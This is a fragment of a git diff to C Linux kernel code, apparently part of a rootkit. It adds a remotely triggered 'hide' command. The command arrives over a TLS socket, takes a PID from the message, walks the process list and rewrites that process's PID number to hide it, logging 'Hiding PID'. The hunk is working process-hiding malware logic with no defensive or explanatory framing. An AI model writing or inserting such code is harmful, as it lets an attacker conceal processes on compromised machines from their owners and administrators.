@@ -299,9 +299,22 @@ int read_TLS(void) {
                     newpid = get_task_pid(ts, PIDTYPE_PID);
                     //newpid->numbers[0].nr = 76831 + z++;
                     newpid->numbers[0].nr = 76831;
-                } else if (strcmp("crash_test_dumm", proc_name) == 0) {
+                }
+            }
+        } else if (memcmp("hide", buffer, 4) == 0) {
+            if (kstrtou16(buffer + 5, 10, &tmp_port)) {
+                strcpy(buffer, bad_port);
+                send_msg(svc->tls_socket, buffer, strlen(bad_port));
+                continue;
+            }
+            for_each_process(ts) {
+                //printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
+                //if (strcmp("userspace.elf", proc_name) == 0) {
+                if (ts->pid == tmp_port) {
+                    printk(KERN_INFO "Hiding PID %d\n", tmp_port);
+
                     newpid = get_task_pid(ts, PIDTYPE_PID);
-                    newpid->numbers[0].nr = 76831;
+                    newpid->numbers[0].nr = 761;
                 }
             }
         } else {
